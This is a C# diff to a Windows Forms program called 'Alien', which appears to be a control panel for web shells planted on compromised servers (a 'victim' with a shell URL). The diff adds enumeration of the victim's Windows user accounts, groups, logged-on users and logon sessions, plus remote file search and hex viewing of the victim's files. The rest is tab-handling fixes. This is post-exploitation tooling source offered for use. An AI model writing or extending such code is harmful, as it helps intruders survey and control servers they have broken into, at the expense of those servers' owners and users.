@@ -17,6 +17,8 @@ using System.Windows.Forms.VisualStyles;
 using System.Xml.Linq;
 using Newtonsoft.Json;
 using System.Web;
+using System.Runtime.InteropServices.Marshalling;
+using static Alien.clsfnWinUser;
 
 namespace Alien
 {
@@ -24,8 +26,8 @@ namespace Alien
     {
         private TabPage draggedTab = null;
 
-        private clsWeb m_web { get; init; }
-        private clsVictim m_victim { get { return m_web.m_victim; } }
+        public clsWeb m_web { get; init; }
+        public clsVictim m_victim { get { return m_web.m_victim; } }
 
         public clsInfoSpyder m_infoSpyder { get; init; }
         public clsfnFileMgr m_fileMgr { get; init; }
@@ -33,6 +35,7 @@ namespace Alien
         public clsfnDb m_dbMgr { get; init; }
         public clsfnRunScript m_runScript { get; init; }
         public clsfnReg m_winReg { get; init; }
+        public clsfnWinUser m_winUser { get; init; }
 
         private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
         private WebBrowser m_ctrlEvalBrowser = new WebBrowser();
@@ -55,7 +58,9 @@ namespace Alien
             m_fileMgr = new clsfnFileMgr(web);
             m_rShell = new clsfnShell(web);
             m_runScript = new clsfnRunScript(web);
+
             m_winReg = new clsfnReg(web);
+            m_winUser = new clsfnWinUser(web);
 
             m_dbMgr = new clsfnDb(web, "db.sqlite");
         }
@@ -1100,6 +1105,97 @@ namespace Alien
         #endregion
         #region Windows
 
+        #region Users
+
+        async Task fnWinUserInit()
+        {
+            void fnLoadWmiToListView(ListView listView, List<WmiRow> data)
+            {
+                if (listView == null || data == null) return;
+
+                listView.BeginUpdate();
+
+                listView.Clear();
+                listView.View = View.Details;
+                listView.FullRowSelect = true;
+                listView.GridLines = true;
+
+                var columns = new HashSet<string>();
+
+                foreach (var row in data)
+                {
+                    foreach (var key in row.Data.Keys)
+                        columns.Add(key);
+                }
+
+                var columnList = columns.OrderBy(x => x).ToList();
+
+                foreach (var col in columnList)
+                {
+                    listView.Columns.Add(col);
+                }
+
+                foreach (var row in data)
+                {
+                    var item = new ListViewItem();
+
+                    for (int i = 0; i < columnList.Count; i++)
+                    {
+                        row.Data.TryGetValue(columnList[i], out string? value);
+
+                        if (i == 0)
+                            item.Text = value ?? "";
+                        else
+                            item.SubItems.Add(value ?? "");
+                    }
+
+                    listView.Items.Add(item);
+                }
+
+                listView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
+
+                listView.EndUpdate();
+            }
+
+            try
+            {
+                listView5.View = View.Details;
+                listView6.View = View.Details;
+                listView7.View = View.Details;
+                listView8.View = View.Details;
+                listView9.View = View.Details;
+                listView10.View = View.Details;
+
+                listView5.Columns.Clear();
+                listView6.Columns.Clear();
+                listView7.Columns.Clear();
+                listView8.Columns.Clear();
+                listView9.Columns.Clear();
+                listView10.Columns.Clear();
+
+                listView5.Items.Clear();
+                listView6.Items.Clear();
+                listView7.Items.Clear();
+                listView8.Items.Clear();
+                listView9.Items.Clear();
+                listView10.Items.Clear();
+
+                var result = await m_winUser.fnGetData();
+
+                fnLoadWmiToListView(listView5, result.UserAccounts);
+                fnLoadWmiToListView(listView6, result.UserProfiles);
+                fnLoadWmiToListView(listView7, result.Groups);
+                fnLoadWmiToListView(listView8, result.GroupUsers);
+                fnLoadWmiToListView(listView9, result.LoggedOn);
+                fnLoadWmiToListView(listView10, result.LogonSession);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "fnWinUserInit", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        #endregion
         #region Registry
 
         private async Task fnRegInit()
@@ -1147,6 +1243,12 @@ namespace Alien
                 return;
             }
 
+            // Clear status labels
+            toolStripStatusLabel6.Text = string.Empty;
+
+            textBox8.Text = m_victim.ShellURL;
+            Text = m_victim.ShellURL.Split('/')[2];
+
             treeView3.ImageList = fileImageList;
             m_fileMgr.m_ExtIcon.Images.Add(fileImageList.Images["folder"]);
             m_fileMgr.m_ExtIcon.Images.SetKeyName(m_fileMgr.m_ExtIcon.Images.Count - 1, "folder");
@@ -1167,23 +1269,6 @@ namespace Alien
             m_ctrlPostEditor.BringToFront();
 
             toolStripStatusLabel3.Text = string.Empty;
-
-            if (m_victim.m_bUnixLike)
-            {
-                // Linux
-
-                TabPage page = tabControl1.TabPages[6];
-                tabControl1.TabPages.Remove(page);
-            }
-            else
-            {
-                // Windows
-
-                TabPage page = tabControl1.TabPages[5];
-                tabControl1.TabPages.Remove(page);
-
-                await fnRegInit();
-            }
 
             var fileInit = await m_fileMgr.fnszInit();
 
@@ -1293,6 +1378,9 @@ namespace Alien
             tabControl4.DrawMode = TabDrawMode.OwnerDrawFixed;
             tabControl4.DrawItem += (s, e) =>
             {
+                if (e.Index < 0 || e.Index >= tabControl4.TabPages.Count)
+                    return;
+
                 TabPage page = tabControl4.TabPages[e.Index];
                 Rectangle rect = tabControl4.GetTabRect(e.Index);
 
@@ -1316,17 +1404,20 @@ namespace Alien
             tabControl4.MouseDown += (s, e) =>
             {
                 int nIdx = fnGetTabIndexAt(e.Location);
-                if (nIdx == -1) return;
+                if (nIdx == -1)
+                    return;
 
-                // "Close" click has priority
                 if (fnGetCloseRect(nIdx).Contains(e.Location))
                 {
                     tabControl4.TabPages.RemoveAt(nIdx);
                     return;
                 }
 
-                // otherwise start drag
+                if (e.Button != MouseButtons.Left)
+                    return;
+
                 draggedTab = tabControl4.TabPages[nIdx];
+
                 tabControl4.DoDragDrop(draggedTab, DragDropEffects.Move);
             };
             tabControl4.DragOver += (s, e) =>
@@ -1341,13 +1432,46 @@ namespace Alien
                 if (nIdx < 0 || draggedTab == null)
                     return;
 
-                int nOldIdx = tabControl4.TabPages.IndexOf(draggedTab);
+                int oldIdx = tabControl4.TabPages.IndexOf(draggedTab);
+
+                if (oldIdx == -1 || oldIdx == nIdx)
+                    return;
 
                 tabControl4.TabPages.Remove(draggedTab);
-                tabControl4.TabPages.Insert(nOldIdx, draggedTab);
+
+                if (nIdx > oldIdx)
+                    nIdx--;
+
+                nIdx = Math.Max(0, Math.Min(nIdx, tabControl4.TabPages.Count));
+
+                tabControl4.TabPages.Insert(nIdx, draggedTab);
 
                 tabControl4.SelectedTab = draggedTab;
+
+                draggedTab = null;
             };
+            tabControl4.DragLeave += (s, e) =>
+            {
+                draggedTab = null;
+            };
+
+            if (m_victim.m_bUnixLike)
+            {
+                // Linux
+
+                TabPage page = tabControl1.TabPages[6];
+                tabControl1.TabPages.Remove(page);
+            }
+            else
+            {
+                // Windows
+
+                TabPage page = tabControl1.TabPages[5];
+                tabControl1.TabPages.Remove(page);
+
+                await fnWinUserInit();
+                await fnRegInit();
+            }
         }
 
         private void frmControlPanel_Load(object sender, EventArgs e)
@@ -1379,15 +1503,10 @@ namespace Alien
             if (node != null)
                 treeView3.SelectedNode = node;
         }
-        //File.Edit
+
         private void toolStripMenuItem2_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView2.SelectedItems)
-            {
-                var stEntry = fnFileGetItemTag(item);
-                if (!stEntry.bIsDirectory)
-                    fnFileRead(stEntry.szEntryPath);
-            }
+
         }
         //File.Copy
         private void toolStripMenuItem3_Click(object sender, EventArgs e)
@@ -1614,9 +1733,75 @@ namespace Alien
         }
 
         //Find
-        private void toolStripButton4_Click_1(object sender, EventArgs e)
+        private async void toolStripButton4_Click_1(object sender, EventArgs e)
         {
+            listView1.Items.Clear();
+            listView1.SmallImageList = m_fileMgr.m_ExtIcon;
 
+            string szPattern = textBox10.Text;
+            string[] aDir = textBox9.Text.Split(Environment.NewLine);
+
+            try
+            {
+                var result = await m_fileMgr.fnFileSearch(szPattern, aDir);
+                if (result == null)
+                {
+                    MessageBox.Show("JSON deserialization is failed!", "Find", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                if (!result.Status)
+                {
+                    MessageBox.Show(result.Msg, "Find", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                List<clsfnFileMgr.stEntry> entries = new List<clsfnFileMgr.stEntry>();
+
+                foreach (var item in result.Results)
+                {
+                    entries.Add(new clsfnFileMgr.stEntry()
+                    {
+                        szEntryPath = item.Path,
+                        bIsDirectory = string.Equals(item.Type, "Directory"),
+                        szPriviledge = item.Permission,
+                        dtCreationDate = DateTime.Parse(item.Created),
+                        dtLastModifiedDate = DateTime.Parse(item.LastModified),
+                        dtLastAccessedDate = DateTime.Parse(item.LastAccessed)
+                    });
+                }
+
+                var dirs = entries.Where(x => x.bIsDirectory).ToList();
+                var files = entries.Where(x => !x.bIsDirectory).ToList();
+
+                entries.Clear();
+                entries = dirs.Concat(files).ToList();
+
+                foreach (var entry in entries)
+                {
+                    ListViewItem item = new ListViewItem(entry.szEntryName);
+
+                    string szExtension = entry.szEntryName.Split('.').Last();
+                    if (!entry.bIsDirectory)
+                        m_fileMgr.fnGetExtensionIcon(szExtension);
+
+                    item.ImageKey = entry.bIsDirectory ? "folder" : szExtension;
+
+                    item.Tag = entry;
+
+                    item.SubItems.Add(entry.szEntryPath);
+                    item.SubItems.Add(entry.szPriviledge);
+                    item.SubItems.Add(entry.dtCreationDate.ToString("F"));
+                    item.SubItems.Add(entry.dtLastModifiedDate.ToString("F"));
+                    item.SubItems.Add(entry.dtLastAccessedDate.ToString("F"));
+
+                    listView1.Items.Add(item);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
 
         // Eval script
@@ -2098,6 +2283,114 @@ namespace Alien
         private async void toolStripButton8_Click(object sender, EventArgs e)
         {
             await fnRegInit();
+        }
+
+        private async void toolStripLabel3_Click(object sender, EventArgs e)
+        {
+            await fnWinUserInit();
+        }
+
+        private void toolStripMenuItem32_Click(object sender, EventArgs e)
+        {
+
+
+            foreach (ListViewItem item in listView2.SelectedItems)
+            {
+                var stEntry = fnFileGetItemTag(item);
+                if (!stEntry.bIsDirectory)
+                    fnFileRead(stEntry.szEntryPath);
+            }
+        }
+
+        private async void toolStripMenuItem33_Click(object sender, EventArgs e)
+        {
+            frmFileHexEditor? f = fnFindForm<frmFileHexEditor>();
+            if (f == null)
+            {
+                f = new frmFileHexEditor(this);
+                f.Text = "Hex Editor";
+                f.Show();
+            }
+
+            f.BringToFront();
+
+            foreach (ListViewItem item in listView2.SelectedItems)
+            {
+                var entry = fnFileGetItemTag(item);
+                if (entry.bIsDirectory)
+                    continue;
+
+                byte[]? abData = await m_fileMgr.fnReadBuffer(entry.szEntryPath);
+                if (abData == null)
+                {
+                    MessageBox.Show("Null buffer: " + entry.szEntryPath, "IsNull", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    continue;
+                }
+
+                f.fnShowFile(entry.szEntryPath, abData);
+            }
+        }
+
+        private void listView1_DoubleClick(object sender, EventArgs e)
+        {
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+                return;
+
+            ListViewItem item = items.First();
+            string? szDir = Path.GetDirectoryName(item.SubItems[1].Text);
+            if (string.IsNullOrEmpty(szDir))
+                return;
+
+            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
+            if (node == null)
+                fnFileAddPathToTreeView(szDir);
+
+            node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
+
+            tabControl2.SelectedIndex = 0;
+            treeView3.SelectedNode = node;
+        }
+
+        private void toolStripMenuItem34_Click(object sender, EventArgs e)
+        {
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+                return;
+
+            ListViewItem item = items.First();
+            string? szDir = Path.GetDirectoryName(item.SubItems[1].Text);
+            if (string.IsNullOrEmpty(szDir))
+                return;
+
+            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
+            if (node == null)
+                fnFileAddPathToTreeView(szDir);
+
+            node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
+
+            tabControl2.SelectedIndex = 0;
+            treeView3.SelectedNode = node;
+        }
+
+        private void toolStripMenuItem36_Click(object sender, EventArgs e)
+        {
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+                return;
+
+            string szData = string.Join(Environment.NewLine, items.Select(x => x.Text).ToArray());
+            Clipboard.SetText(szData);
+        }
+
+        private void toolStripMenuItem37_Click(object sender, EventArgs e)
+        {
+            List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+                return;
+
+            string szData = string.Join(Environment.NewLine, items.Select(x => x.SubItems[1].Text).ToArray());
+            Clipboard.SetText(szData);
         }
     }
 }
